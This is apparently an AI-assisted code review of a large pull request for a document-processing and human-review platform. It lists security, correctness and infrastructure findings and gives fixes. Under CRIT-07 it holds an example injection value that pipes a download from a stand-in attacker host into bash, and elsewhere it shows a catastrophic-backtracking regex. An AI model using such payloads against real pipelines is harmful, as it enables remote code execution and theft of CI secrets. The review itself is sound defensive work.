# PR #88 Comprehensive Code Review: `integration/combined` → `develop`

**Reviewer:** AI-Assisted Deep Review  
**Date:** April 17, 2026  
**Scope:** 445 files changed, +63,747 / -15,583 lines  
**Branch:** `integration/combined` → `develop`

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Critical Findings](#critical-findings)
3. [High Severity Findings](#high-severity-findings)
4. [Medium Severity Findings](#medium-severity-findings)
5. [Low Severity Findings](#low-severity-findings)
6. [Positive Observations](#positive-observations)
7. [Finding Summary Table](#finding-summary-table)

---

## Executive Summary

This PR merges a long-lived integration branch combining three parallel workstreams (infra-and-deployment, hitl-enhancements, AI-1053-self-improving-workflows) plus extensive feature development. The review identified **10 critical**, **16 high**, **22 medium**, and **15 low** severity findings across security, correctness, architecture, infrastructure, and code quality domains.

**Top priority action items:**
1. Fix React Rules of Hooks violations (crashes in production)
2. Fix IDOR vulnerability in confusion profile endpoints  
3. Fix broken redo functionality (data loss for HITL reviewers)
4. Add database migration baselining strategy (blocks all existing environments)
5. Fix CI/CD script injection vulnerabilities
6. Fix document lock race condition (concurrent review data corruption)

---

## Critical Findings

### CRIT-01: React Rules of Hooks Violation — Early Returns Before Hooks

**Files:**
- `apps/frontend/src/features/annotation/template-models/pages/LabelingWorkspacePage.tsx` (line ~93)
- `apps/frontend/src/features/annotation/template-models/pages/ModelDetailPage.tsx` (line ~131)

Both components have conditional early `return` statements **before** subsequent `useFieldSchema()`, `useTemplateModel()`, and other hook calls:

```tsx
// LabelingWorkspacePage.tsx
const { modelId, documentId } = useParams<{...}>();
if (!modelId || !documentId) {
  return (<Stack>...</Stack>);  // ← EARLY RETURN
}
const { schema } = useFieldSchema(modelId);  // ← Hook called conditionally!
```

```tsx
// ModelDetailPage.tsx
if (!routeModelId) {
  return (<Center>...</Center>);  // ← EARLY RETURN
}
const { templateModel } = useTemplateModel(routeModelId);  // ← Hook called conditionally!
```

**Impact:** React requires hooks to be called in the same order every render. When params are undefined then defined (e.g., during navigation), React's internal hook state will corrupt, causing crashes, infinite loops, or silent data corruption.

**Fix:** Move guards below all hook calls, or split into a wrapper component with the guard and an inner component with the hooks.

---

### CRIT-02: Redo Functionality is Broken — Restores Wrong Value

**File:** `apps/frontend/src/features/annotation/hitl/pages/ReviewWorkspacePage.tsx` (lines 673-688)

The `handleRedo` callback restores `entry.previousValue` — which is the **pre-edit value** (the same value undo restores). The `UndoEntry` interface only stores `previousValue`, not the new value:

```tsx
const handleRedo = useCallback(() => {
  const entry = redo();
  if (entry) {
    setCorrectionMap((prev) => ({
      ...prev,
      [entry.fieldKey]: {
        corrected_value: entry.previousValue,  // BUG: same as undo
        action: CorrectionAction.CORRECTED,
      },
    }));
  }
}, [redo, fields]);
```

The `UndoEntry` interface:
```tsx
interface UndoEntry {
  type: "field-edit" | "correction-delete";
  fieldKey: string;
  previousValue: string;  // Only stores pre-edit value
  // Missing: newValue for redo
}
```

**Impact:** Ctrl+Shift+Z (redo) performs the same action as Ctrl+Z (undo) — both revert. HITL reviewers can lose corrections. This is a data loss bug in a core review workflow.

**Fix:** Add `newValue: string` to `UndoEntry`. Store the new value in `pushUndo()`. Undo restores `previousValue`; redo restores `newValue`.

---

### CRIT-03: IDOR — Confusion Profile CRUD Not Scoped to Group

**File:** `apps/backend-services/src/confusion-profile/confusion-profile.controller.ts` (lines 153-198)

The `GET :id`, `PATCH :id`, and `DELETE :id` endpoints verify the user belongs to `:groupId` (from URL), but the service methods operate solely on the profile `id` without checking the profile actually belongs to that group:

```typescript
// Controller — checks user is in groupId ✅
@Patch(":id")
async update(@Param("groupId") groupId: string, @Param("id") id: string, ...) {
  identityCanAccessGroup(req.resolvedIdentity, groupId);  // ✅
  return this.confusionProfileService.update(id, dto);     // ❌ operates on ANY profile
}

// Service — no group ownership check
async update(id: string, input: UpdateProfileInput) {
  await this.findById(id);  // findUnique by id only, no group_id filter
  // ...updates without verifying group ownership
}
```

**Impact:** A user in Group A can read, modify, or delete confusion profiles belonging to Group B by crafting `PATCH /api/groups/<their-group-id>/confusion-profiles/<target-profile-id>`.

**Fix:** Pass `groupId` into service methods and add `AND { group_id: groupId }` to the Prisma `where` clause, or verify `profile.group_id === groupId` after fetch.

---

### CRIT-04: Migration Squash Breaks All Existing Databases

**Files:**
- `apps/shared/prisma/migrations/20260328205045_init/migration.sql` (new squashed init)
- 50+ deleted migration folders from `20251114174549` through `20260326164518`

The PR deletes ~50 individual migration files and replaces them with a single squashed init. Any database that has already run the old migrations has those migration names recorded in `_prisma_migrations`. After merging, `prisma migrate deploy` will fail because Prisma cannot find migration files matching the recorded entries.

There is **no baselining script, no documentation, and no `prisma migrate resolve --applied` step** anywhere in the repo.

**Impact:** Running `prisma migrate deploy` on any existing environment (staging, shared dev, integration, production) will fail immediately after this PR merges.

**Fix:** Either:
1. Add a migration script that clears old entries from `_prisma_migrations` and marks the squashed init as applied, OR
2. Document that existing databases must run `prisma migrate resolve --applied 20260328205045_init`, OR
3. Provide a one-time migration reset procedure (data loss — dev only)

---

### CRIT-05: ReDoS Vulnerability in Format Validation (Frontend)

**File:** `apps/frontend/src/features/annotation/hitl/utils/format-validation.ts` (line ~210)

User-controlled `spec.pattern` (from field definitions) is compiled into a `RegExp` with no sanitization:

```tsx
export function validateFieldValue(value: string, spec: FormatSpec): string | null {
  const regex = new RegExp(spec.pattern);  // ← pattern from DB/field definitions
  if (regex.test(canonicalized)) return null;
```

**Impact:** A malicious or poorly-crafted pattern (e.g., `(a+)+$`) causes catastrophic backtracking, freezing the browser tab. This runs on every keystroke in the HITL review form.

**Fix:** Wrap in try/catch at minimum. Use `safe-regex` or `re2` for server-side validation at save time. Add a timeout guard or pattern complexity limit.

---

### CRIT-06: ReDoS Vulnerability in Field Format Engine (Temporal Worker)

**File:** `apps/temporal/src/field-format-engine.ts` (lines 119-126)

Same issue as CRIT-05 but on the backend Temporal worker:

```typescript
export function validate(value: string, spec: FormatSpec): { valid: boolean; message?: string } {
  const regex = new RegExp(spec.pattern);  // ← from database format_spec
  if (regex.test(canonical)) { return { valid: true }; }
```

**Impact:** Denial of service for the Temporal worker. A catastrophic regex blocks the entire Node.js event loop, stalling all activities on that worker until Temporal's activity timeout fires.

**Fix:** Validate regex patterns at save time (field schema creation). Wrap `regex.test()` in a worker thread with a timeout, or use `safe-regex`.

---

### CRIT-07: Script Injection in `migrate-db.yml` Workflow

**File:** `.github/workflows/migrate-db.yml` (lines 87-99)

The `changed_apps` workflow_dispatch input is directly interpolated into shell commands:

```yaml
if [ -z "${{ inputs.changed_apps }}" ]; then    # ← double-quoted, injectable
```

A malicious caller could pass `"; curl attacker.com/pwn | bash; #` as the input value.

**Impact:** Arbitrary command execution in the CI environment with access to secrets.

**Fix:** Assign to an environment variable first:
```yaml
env:
  CHANGED_APPS: ${{ inputs.changed_apps }}
run: |
  if [ -z "$CHANGED_APPS" ]; then ...
```

---

### CRIT-08: Script Injection in `deploy-instance.yml` Workflow

**File:** `.github/workflows/deploy-instance.yml` (line 31)

```yaml
RAW_BRANCH="${{ github.ref_name }}"
```

`github.ref_name` is user-controlled. If the commented-out `push` trigger is ever re-enabled, a branch name with shell metacharacters would execute arbitrary commands.

**Impact:** Currently mitigated by `workflow_dispatch` only trigger, but a latent vulnerability that becomes critical if push trigger is restored.

**Fix:** Use `env:` assignment: `env: RAW_BRANCH: ${{ github.ref_name }}`.

---

### CRIT-09: MapNode Shallow Copy Corrupts Concurrent Branch Context

**File:** `apps/temporal/src/graph-engine/node-executors.ts` (lines 260-261)

```typescript
const branchCtx: Record<string, unknown> = { ...state.ctx };
branchCtx[node.itemCtxKey] = item;
```

The spread operator creates a **shallow copy**. If `state.ctx` contains nested objects (e.g., `ocrResult`, `documentMetadata`), all concurrent map branches share references to the same nested objects. Any branch's activity that mutates a nested property corrupts all other branches.

**Impact:** Data corruption in any workflow graph that uses map nodes with activities that modify nested context. Failures are non-deterministic and depend on concurrency timing — extremely difficult to debug.

**Fix:** Use `structuredClone(state.ctx)` (Node 17+) or `JSON.parse(JSON.stringify(state.ctx))` for deep isolation.

---

### CRIT-10: `checkOcrConfidence` Swallows All Errors — Prevents Temporal Retries

**File:** `apps/temporal/src/activities/check-ocr-confidence.ts` (lines 80-87)

```typescript
} catch (error) {
  return { averageConfidence: 0, requiresReview: true };
}
```

This catch-all swallows **transient** failures (DB connection errors, Prisma timeouts) alongside expected errors. The activity returns success, so Temporal never retries. A temporary database outage permanently forces human review for documents that might have had high confidence.

**Impact:** Silent data corruption — documents incorrectly routed to human review with confidence=0.

**Fix:** Only catch expected exceptions. Re-throw transient errors for Temporal retry:
```typescript
} catch (error) {
  if (error instanceof Prisma.PrismaClientKnownRequestError) throw error;
  return { averageConfidence: 0, requiresReview: true };
}
```

---

## High Severity Findings

### HIGH-01: Document Lock TOCTOU Race Condition

**File:** `apps/backend-services/src/hitl/hitl.service.ts` (lines 192-217)

The lock check and lock acquisition are **not in a single transaction**:

```typescript
const existingLock = await this.reviewDb.findActiveLock(dto.documentId);
if (existingLock) { ... }
// --- GAP: another request can acquire the lock here ---
const session = await this.reviewDb.createReviewSession(...);
await this.reviewDb.acquireDocumentLock({...});  // upsert overwrites silently
```

**Impact:** Two reviewers can simultaneously acquire a lock on the same document. The `upsert` silently overwrites the first reviewer's lock. Both users edit concurrently — one user's corrections are lost.

**Fix:** Wrap the entire check → create session → acquire lock sequence in a Prisma interactive transaction with a serializable isolation level or PostgreSQL advisory lock.

---

### HIGH-02: Ground Truth Job Data Migration Uses Non-Deterministic Fallback

**File:** `apps/shared/prisma/migrations/20260402000000_workflow_versions/migration.sql` (lines 104-108)

```sql
UPDATE "dataset_ground_truth_jobs"
SET "workflowVersionId" = (SELECT "id" FROM "workflow_versions" LIMIT 1)
WHERE "workflowVersionId" IS NULL;
```

`SELECT "id" ... LIMIT 1` without `ORDER BY` returns a non-deterministic row. Orphaned ground truth jobs are silently assigned to a random workflow version.

**Fix:** Either fail the migration if orphans exist, or use `ORDER BY created_at ASC LIMIT 1` with a logged warning.

---

### HIGH-03: Workflow Version Migration Silently Nulls Document References

**File:** `apps/shared/prisma/migrations/20260402000000_workflow_versions/migration.sql` (lines 163-166)

```sql
UPDATE "documents" SET "workflow_config_id" = NULL
WHERE "workflow_config_id" NOT IN (SELECT "id" FROM "workflow_versions");
```

Documents with workflow configs that don't match any migrated version silently lose their workflow association with no audit trail.

**Fix:** Log affected documents to a temporary audit table before nulling.

---

### HIGH-04: Missing Error Handling on HITL Approve/Skip/Escalate

**File:** `apps/frontend/src/features/annotation/hitl/pages/ReviewWorkspacePage.tsx` (lines 490-540)

`handleApprove`, `handleSkip`, and `handleEscalate` are async with multiple awaits but **no try/catch**:

```tsx
const handleApprove = async () => {
  await submitCorrectionsAsync(payload);  // If this throws...
  await approveSessionAsync();            // ...everything below is skipped
  notifications.show({ title: "Document approved" });
  clearUndoStack();
  setCorrectionMap({});
  advance();
};
```

**Impact:** Unhandled promise rejection. No user error feedback. UI state becomes inconsistent — corrections may be submitted but session not approved. Data loss possible.

**Fix:** Wrap each handler in try/catch with `notifications.show({ color: "red", ... })`.

---

### HIGH-05: PDF Document Proxy Memory Leak

**File:** `apps/frontend/src/features/annotation/core/canvas/hooks/usePdfPageImage.ts` (lines 45-68)

`pdfDocRef.current` stores a `PDFDocumentProxy` but `.destroy()` is never called in cleanup:

```tsx
useEffect(() => {
  const loadDoc = async () => {
    const doc = await pdfjsLib.getDocument(pdfUrl).promise;
    pdfDocRef.current = doc;  // ← Never destroyed
  };
  void loadDoc();
  return () => { cancelled = true; };  // ← No doc.destroy()
}, [pdfUrl]);
```

**Impact:** Memory leak. Multi-page PDFs accumulate hundreds of MB over a review session. Reviewers processing many documents will experience browser crashes.

**Fix:** Add `pdfDocRef.current?.destroy()` in the cleanup function.

---

### HIGH-06: Image Load Race Condition on Rapid URL Changes

**File:** `apps/frontend/src/features/annotation/core/canvas/AnnotationCanvas.tsx` (lines 137-146)

```tsx
useEffect(() => {
  if (imageUrl) {
    const img = new window.Image();
    img.src = imageUrl;
    img.onload = () => {
      imageRef.current = img;  // No cancellation check
      setImageSize({ width: img.naturalWidth, height: img.naturalHeight });
    };
  }
}, [imageUrl]);
```

**Impact:** Rapid page switching causes concurrent image loads. An older image resolving after a newer one sets stale dimensions, causing rendering artifacts. No cleanup on unmount.

**Fix:** Add a `cancelled` boolean in cleanup; set `img.onload = null; img.src = ""` on cleanup.

---

### HIGH-07: Content-Disposition Header Injection

**Files:**
- `apps/backend-services/src/document/document.controller.ts` (line 556)
- `apps/backend-services/src/benchmark/dataset.controller.ts` (line 598)

User-supplied `original_filename` is interpolated into headers without sanitization:

```typescript
res.setHeader("Content-Disposition", `inline; filename="${fileName}"`);
```

Filenames containing `"`, `\r\n`, or control characters can inject HTTP headers.

**Fix:** Sanitize to `[a-zA-Z0-9._-]` or use RFC 6266 `filename*=UTF-8''${encodeURIComponent(fileName)}`.

---

### HIGH-08: Stack Traces Persisted and Served via Debug Log API

**File:** `apps/backend-services/src/benchmark/ocr-improvement-pipeline.service.ts` (lines 484-489)

```typescript
const stack = error instanceof Error ? error.stack : undefined;
logEntries.push({ step: "error", data: { message, stack } });
await persistLog();  // ← returned via GET debug-log endpoint
```

**Impact:** Full stack traces (internal file paths, line numbers, module structure) exposed to any authenticated group member via the debug log endpoint.

**Fix:** Log stack server-side only. Omit `stack` from persisted debug log entries.

---

### HIGH-09: Benchmark Workflow Cleanup Failure Leaves Run in Stale Status

**File:** `apps/temporal/src/benchmark-workflow.ts` (lines 800-820)

If `benchmark.cleanup` throws, `benchmark.updateRunStatus("failed")` is never called:

```typescript
if (materializedPath) {
  await customActivities["benchmark.cleanup"]({...});  // If this throws...
}
await customActivities["benchmark.updateRunStatus"]({  // ...never reached
  runId, status: "failed"
});
```

**Impact:** Benchmark run stuck in `"running"` status permanently.

**Fix:** Wrap cleanup in try/catch:
```typescript
try { await customActivities["benchmark.cleanup"]({...}); } catch { /* log */ }
await customActivities["benchmark.updateRunStatus"]({...});
```

---

### HIGH-10: `getWorkflowGraphConfig` Throws Retryable Error for Non-Transient Failure

**File:** `apps/temporal/src/activities/get-workflow-graph-config.ts` (line 42)

```typescript
throw new Error(`Workflow not found by ID or name: ${input.workflowId}`);
```

A generic `Error` is retryable by default in Temporal. A missing workflow won't appear on retry — wastes all retry attempts.

**Fix:** Use `ApplicationFailure.create({ nonRetryable: true })`.

---

### HIGH-11: Spellcheck Blindly Replaces with First Suggestion

**File:** `apps/temporal/src/activities/ocr-spellcheck.ts` (lines 93-99)

```typescript
const suggestions = spell.suggest(word);
const best = suggestions[0];  // No similarity/confidence check
```

**Impact:** Domain-specific abbreviations and proper nouns are silently replaced with dictionary words, degrading OCR quality.

**Fix:** Add minimum edit-distance threshold before accepting a suggestion.

---

### HIGH-12: TLS Verification Disabled Everywhere (`--insecure-skip-tls-verify`)

**Files:** 14 locations across scripts and workflows (deploy-instance.yml, oc-deploy.sh, oc-login-sa.sh, oc-backup-db.sh, oc-restore-db.sh, etc.)

All `oc login` commands use `--insecure-skip-tls-verify=true`, disabling certificate verification.

**Impact:** Vulnerable to MITM attacks against the OpenShift API server.

**Fix:** Use the BC Gov Silver cluster's CA certificate, or document the risk acceptance.

---

### HIGH-13: Open Network Policy — Allows All Ingress

**File:** `deployments/openshift/kustomize/base/backend-services/networkpolicy.yml`

```yaml
ingress:
  - {}  # ← Allows ALL traffic from ANY source
```

**Impact:** Defeats the purpose of NetworkPolicy. Any pod in the cluster can reach the backend.

**Fix:** Restrict to frontend and temporal pods:
```yaml
ingress:
  - from:
    - podSelector: { matchLabels: { app: frontend } }
    - podSelector: { matchLabels: { app: temporal } }
```

---

### HIGH-14: Service Account Token with 10-Year Expiry

**File:** `scripts/oc-setup-sa.sh` (line 186)

```bash
TOKEN=$(oc create token "${SA_NAME}" --duration=87600h)  # 10 years
```

**Impact:** Extremely long-lived token with broad permissions (deploy, delete, exec into pods, manage secrets).

**Fix:** Reduce to 30-90 days with documented rotation procedure.

---

### HIGH-15: Stale Closures from Suppressed ESLint `react-hooks/exhaustive-deps`

**File:** `apps/frontend/src/features/annotation/hitl/pages/ReviewWorkspacePage.tsx`

3 `eslint-disable-line react-hooks/exhaustive-deps` suppressions:

- **Line ~230:** Correction seeding effect missing `correctionMap` dep — can overwrite user corrections on query refetch
- **Line ~400:** Focus effect missing `filteredSortedFields` dep — uses stale field list
- **Line ~489:** Other suppressed deps

**Impact:** Stale closures cause subtle bugs: user corrections silently overwritten, wrong field focused.

**Fix:** Refactor each effect to properly handle its dependencies or use refs for values that shouldn't trigger re-runs.

---

### HIGH-16: Missing Async Cancellation in `LabelingWorkspacePage`

**File:** `apps/frontend/src/features/annotation/template-models/pages/LabelingWorkspacePage.tsx` (lines 172-190)

The `loadDocument` effect has no cancellation mechanism — no `cancelled` flag between awaits, no Object URL cleanup:

```tsx
useEffect(() => {
  const loadDocument = async () => {
    let response = await fetch(`${base}/view`, { credentials: "include" });
    const blob = await response.blob();
    const url = URL.createObjectURL(blob);
    setDocumentUrl(url);  // ← Fires after unmount, URL leaked
  };
  void loadDocument();
}, [templateModelDocument?.labeling_document, modelId, documentId]);
```

**Impact:** Object URL memory leak on navigation. `setDocumentUrl` on unmounted component.

**Fix:** Add `cancelled` flag and `URL.revokeObjectURL()` in cleanup.

---

## Medium Severity Findings

### MED-01: `migrate-db.yml` Migration Path Filter References Wrong Path

**File:** `.github/workflows/migrate-db.yml` (line 51)

```yaml
filters: |
  migration:
    - 'apps/backend/prisma/migrations/**'
```

Actual path: `apps/shared/prisma/migrations/**`. Migration detection **never triggers**.

**Fix:** Change to `apps/shared/prisma/migrations/**`.

---

### MED-02: Missing Indexes on `ReviewSession` and `FieldCorrection`

**File:** `apps/shared/prisma/schema.prisma`

- `ReviewSession` has `document_id` FK but no `@@index([document_id])` — review queue queries do sequential scans
- `FieldCorrection` has `session_id` FK but no `@@index([session_id])` — correction lookups are sequential scans

**Fix:** Add `@@index([document_id])` to `ReviewSession` and `@@index([session_id])` to `FieldCorrection`.

---

### MED-03: Unvalidated JSON Depth on Metadata Fields

**Files:** Multiple DTOs (`upload-document.dto.ts`, `create-definition.dto.ts`, `update-confusion-profile.dto.ts`)

```typescript
@IsObject()
@IsOptional()
metadata?: Record<string, unknown>;
```

No constraint on nesting depth, key count, or size. Deeply nested payloads can consume excessive memory during JSON serialization.

**Fix:** Add a custom validator enforcing maximum depth (e.g., 5 levels) and key count.

---

### MED-04: `getQueueStats` Loads 1000 Documents Into Memory

**File:** `apps/backend-services/src/hitl/hitl.service.ts` (lines 114-139)

Loads up to 1000 documents with OCR results, then filters in-memory for confidence thresholds.

**Fix:** Move confidence filtering into the database query using aggregation.

---

### MED-05: `execSync` in Request Path

**File:** `apps/backend-services/src/benchmark/benchmark-run.service.ts` (lines 60-65)

```typescript
private getWorkerGitSha(): string {
  return execSync("git rev-parse HEAD", { encoding: "utf-8" }).trim();
}
```

Blocks the event loop on every `startRun` call.

**Fix:** Cache the result at module load time.

---

### MED-06: Confusion Profile Matrix Lacks Size Constraints

**File:** `apps/backend-services/src/confusion-profile/dto/create-confusion-profile.dto.ts`

```typescript
@IsObject()
matrix!: Record<string, Record<string, number>>;
```

No limit on matrix dimensions. An attacker could send millions of entries.

**Fix:** Add custom validator limiting key count.

---

### MED-07: Confusion Profile Last-Writer-Wins Ambiguity

**File:** `apps/temporal/src/activities/ocr-character-confusion.ts` (lines 290-299)

```typescript
for (const [trueChar, recognized] of Object.entries(matrix)) {
  for (const [recognizedChar] of Object.entries(recognized)) {
    map[recognizedChar] = trueChar;  // Silently overwritten
  }
}
```

Multiple true characters mapping to the same recognized character silently overwrite each other.

**Fix:** Log warning on overwrite or validate one-to-one mapping at profile creation.

---

### MED-08: OCR Correction Evaluator Word Accuracy Uses Set (Ignores Duplicates)

**File:** `apps/temporal/src/evaluators/ocr-correction-evaluator.ts` (lines 46-54)

```typescript
const predSet = new Set(predWords);
for (const word of expWords) {
  if (predSet.has(word)) matches++;  // Counts duplicate expected words against single pred
}
```

**Impact:** Inflated word accuracy for texts with repeated words.

**Fix:** Use a counting map instead of a Set.

---

### MED-09: CSS Selector Injection via Unescaped Field Keys

**File:** `apps/frontend/src/features/annotation/hitl/pages/ReviewWorkspacePage.tsx`

Some `querySelector` calls escape field keys with `CSS.escape()`, others don't:

```tsx
// NOT escaped (multiple locations):
document.querySelector(`[data-field-key="${firstField.fieldKey}"]`);

// IS escaped (one location):
panel.querySelector(`[data-field-key="${CSS.escape(activeFieldKey)}"]`);
```

**Fix:** Use `CSS.escape()` consistently everywhere.

---

### MED-10: `ErrorDetectionAnalysis` setState During Render

**File:** `apps/frontend/src/features/benchmarking/components/ErrorDetectionAnalysis.tsx` (lines 36-44)

Calls `setThresholds()` and `setInitializedFor()` during the render phase. While React 18 supports this pattern, two setState calls during render trigger an extra synchronous re-render.

**Fix:** Use `useEffect` for derived state initialization.

---

### MED-11: Konva Tween Resource Leak

**File:** `apps/frontend/src/features/annotation/core/canvas/AnnotationCanvas.tsx` (lines 120-135)

```tsx
new Konva.Tween({ node: stage, duration: 0.2, ... }).play();
```

Tween is never stored or destroyed. If component unmounts during animation, tween holds a reference to destroyed stage.

**Fix:** Store in ref, destroy on cleanup.

---

### MED-12: `useSessionHeartbeat` Interval Recreation

**File:** `apps/frontend/src/features/annotation/hitl/hooks/useSessionHeartbeat.ts` (lines 64-80)

`idleWarning` in dependency array causes interval to be destroyed and recreated every time idle warning state changes.

**Fix:** Use a ref for `idleWarning` inside the interval callback.

---

### MED-13: `useUndoRedo` Module-Level Global State

**File:** `apps/frontend/src/features/annotation/hitl/hooks/useUndoRedo.ts` (lines 15-16)

```tsx
let globalPendingReopen: ReopenUndoEntry | null = null;
let globalReopenTimer: ReturnType<typeof setTimeout> | undefined;
```

Module-level mutable state persists across mounts. Timer not cleaned up on unmount.

**Fix:** Clean up timer in useEffect cleanup. Clear global state on component unmount.

---

### MED-14: Upload Error Message Leaks Internal Details

**File:** `apps/backend-services/src/upload/upload.controller.ts` (lines 143-146)

```typescript
throw new BadRequestException(getErrorMessage(error) || "Failed to upload document");
```

Raw error messages from blob storage/filesystem forwarded to client.

**Fix:** Use generic message for unexpected errors; log details server-side.

---

### MED-15: `normalizeOcrFields` Unsafe Type Cast

**File:** `apps/temporal/src/activities/ocr-normalize-fields.ts` (line 262)

```typescript
val.content = mode === "blank" ? "" : (null as unknown as string);
```

Sets `content` to `null` while typed as `string`. Downstream `.trim()` calls will throw.

**Fix:** Use empty string for both modes, or make `content` nullable in the type.

---

### MED-16: Date Parsing Ambiguity (DD/MM vs MM/DD)

**File:** `apps/temporal/src/form-field-normalization.ts` (lines 93-97)

Ambiguous dates like `03/04/2024` always parsed as DD/MM/YYYY. Undocumented behavior.

**Fix:** Document the convention; consider making it configurable per locale/group.

---

### MED-17: Frontend Network Policy for Nginx Missing `server_tokens off`

**File:** `apps/frontend/nginx-default.conf`

Missing `server_tokens off;` — nginx version exposed in response headers.

**Fix:** Add `server_tokens off;` to nginx config.

---

### MED-18: Docker `npm install` Without Lockfile

**Files:** `apps/backend-services/Dockerfile`, `apps/temporal/Dockerfile`

```dockerfile
RUN npm install --ignore-scripts
```

No lockfile = non-reproducible builds.

**Fix:** Generate a Docker-specific lockfile or use `npm ci` with a transformed lockfile.

---

### MED-19: Grafana Admin Password Defaults to `admin`

**File:** `.github/workflows/deploy-instance.yml` (line 299)

```yaml
--set "grafana.adminPassword=${GRAFANA_ADMIN_PASSWORD:-admin}"
```

**Fix:** Fail deployment if secret not set, or generate random password.

---

### MED-20: `findAllBenchmarkRuns` Has No Pagination

**File:** `apps/backend-services/src/benchmark/benchmark-run-db.service.ts` (lines 136-148)

```typescript
return client.benchmarkRun.findMany({
  where: { projectId },
  include: { definition: true },
  orderBy: { startedAt: "desc" },
  // No take/skip
});
```

**Fix:** Add pagination or hard limit.

---

### MED-21: Cross-Package Import From Backend to Temporal Source

**File:** `apps/backend-services/src/workflow/workflow-modification.util.ts` (line 13)

```typescript
import type { ToolRecommendation } from "../../../temporal/src/ai-recommendation-types";
```

Fragile relative path crossing package boundaries.

**Fix:** Move to shared package.

---

### MED-22: Massive Code Duplication Between Backend and Temporal

Three files are duplicated nearly line-for-line:
- `graph-schema-validator.ts` — ~800 lines each
- `graph-workflow-types.ts` — ~320 lines each  
- `workflow-modification.util.ts` — ~370 lines each

**Fix:** Extract into shared packages (like `@ai-di/graph-insertion-slots` already is).

---

## Low Severity Findings

### LOW-01: LLM System Prompts Exposed via Debug Log

**File:** `apps/backend-services/src/benchmark/ocr-improvement-pipeline.service.ts`

Full Azure OpenAI system/user prompts persisted in debug log and served to any group member.

**Fix:** Restrict debug-log endpoint to ADMIN role or redact prompts.

---

### LOW-02: Duplicate Audit Events in Document Download

**File:** `apps/backend-services/src/document/document.controller.ts`

`downloadDocument` records `document_accessed` twice per download.

---

### LOW-03: No `@MaxLength` on Base64 Upload DTO

**File:** `apps/backend-services/src/upload/dto/upload-document.dto.ts`

```typescript
@IsString() @IsNotEmpty()
file!: string;  // No @MaxLength
```

Implicit body limit exists (50MB), but explicit validation would improve error messages.

---

### LOW-04: `OcrField` Index Signature Defeats TypeScript

**File:** `apps/frontend/src/features/annotation/hitl/pages/ReviewWorkspacePage.tsx` (line 55)

```tsx
interface OcrField { ...; [key: string]: unknown; }
```

Allows accessing any property without type error, defeating TypeScript's purpose.

---

### LOW-05: SnippetView Synchronous Canvas Creation Blocks Main Thread

**File:** `apps/frontend/src/features/annotation/hitl/components/SnippetView.tsx`

Creates a canvas for every field synchronously. 50+ fields block the UI.

**Fix:** Use `requestIdleCallback` or batch processing.

---

### LOW-06: Missing Accessibility Labels on ViewerToolbar

**File:** `apps/frontend/src/features/annotation/core/document-viewer/ViewerToolbar.tsx`

Navigation and zoom `ActionIcon` buttons lack `aria-label`.

---

### LOW-07: ConfusionMatrixEditor Duplicate Key Risk

**File:** `apps/frontend/src/features/benchmarking/components/ConfusionMatrixEditor.tsx`

No dedup check on "Add" — duplicate true/recognized pairs create duplicate React keys.

---

### LOW-08: Missing Test Files

| File | Lines |
|---|---|
| `confusion-profile.controller.ts` | 199 |
| `tool-manifest.service.ts` | 187 |
| `SnippetView.tsx` | 218 |
| `ConfusionMatrixEditor.tsx` | 330 |
| `useReviewSession.ts` | 214 |
| `useUndoRedo.ts` | 160 |
| `useAutoAdvance.ts` | 119 |

Per project standards, backend controllers/services **must** have test files.

---

### LOW-09: `any` Type in Production Code

**File:** `apps/temporal/src/activities/store-document-rejection.ts` (line 35)

```typescript
await (prisma as Record<string, any>).documentRejection.upsert({...})
```

Comment: "DocumentRejection model not yet in Prisma schema."

**Fix:** Add `DocumentRejection` to the Prisma schema.

---

### LOW-10: 281 `as any` Casts in Test Files

Worst offenders: `document.controller.spec.ts` (67), `hitl.service.spec.ts` (33), `hitl.controller.spec.ts` (30).

**Fix:** Create typed test helpers (e.g., `createMockRequest(identity)`).

---

### LOW-11: Unused `_actorId` Parameters

**File:** `apps/backend-services/src/benchmark/dataset.service.ts` (lines 241, 385)

```typescript
_actorId: string,  // TODO: Why isn't this used?
```

---

### LOW-12: PollUntil Node Ignores Config Timeout

**File:** `apps/temporal/src/graph-engine/node-executors.ts` (lines 366-371)

PollUntil nodes always use hardcoded 2-minute timeout regardless of node configuration.

---

### LOW-13: Spellcheck `totalWordsChecked` Counter Counts Fields Not Words

**File:** `apps/temporal/src/activities/ocr-spellcheck.ts` (line 133)

Counter increments per field, not per word — misleading metadata.

---

### LOW-14: Seed File Contains Document-Specific Template (SDPR)

**File:** `apps/shared/prisma/seed.ts`

Per project instructions: "Do not include document-specific implementation."

---

### LOW-15: `Fake 5.pdf` Binary in Repository Root

A 2.3MB test PDF appears in the git diff. Should be in test fixtures or gitignored.

---

## Positive Observations

1. **No raw SQL** — All database access uses Prisma's query builder. Zero `$queryRaw`/`$executeRaw`.
2. **Consistent authentication** — Every controller endpoint has `@Identity` decorator.
3. **Global ValidationPipe** with `whitelist: true` and `forbidNonWhitelisted: true` prevents mass assignment.
4. **`identityCanAccessGroup`** uses `Object.hasOwn()` (not `in` operator), correctly preventing prototype pollution bypass.
5. **Helmet security headers** properly configured (CSP, HSTS, X-Frame-Options, noSniff).
6. **Secrets from environment** — API keys loaded via ConfigService with env-loader.
7. **Blob storage path validation** — `validateBlobFilePath()` prevents path traversal.
8. **Shell scripts** consistently use `set -euo pipefail`, proper quoting, and `${var:-}` defaults.
9. **Multi-stage Docker builds** with non-root runtime users.
10. **Security-patched dependency overrides** (axios, fast-xml-parser, multer, serialize-javascript).
11. **Comprehensive test coverage** for most new services (format engine, OCR normalize, character confusion, evaluators).
12. **Well-designed workflow versioning schema** with proper unique constraints and cascades.

---

## Finding Summary Table

| Severity | ID | Category | Finding | Fix Effort |
|---|---|---|---|---|
| **CRITICAL** | CRIT-01 | Frontend | Rules of Hooks violation in 2 pages | Low |
| **CRITICAL** | CRIT-02 | Frontend | Redo restores wrong value (data loss) | Low |
| **CRITICAL** | CRIT-03 | Security | IDOR on confusion profiles | Low |
| **CRITICAL** | CRIT-04 | Database | Migration squash breaks existing DBs | Medium |
| **CRITICAL** | CRIT-05 | Security | ReDoS in frontend format validation | Medium |
| **CRITICAL** | CRIT-06 | Security | ReDoS in Temporal field format engine | Medium |
| **CRITICAL** | CRIT-07 | CI/CD | Script injection in migrate-db.yml | Low |
| **CRITICAL** | CRIT-08 | CI/CD | Script injection in deploy-instance.yml | Low |
| **CRITICAL** | CRIT-09 | Temporal | MapNode shallow copy corrupts branches | Low |
| **CRITICAL** | CRIT-10 | Temporal | Error swallowing defeats retries | Low |
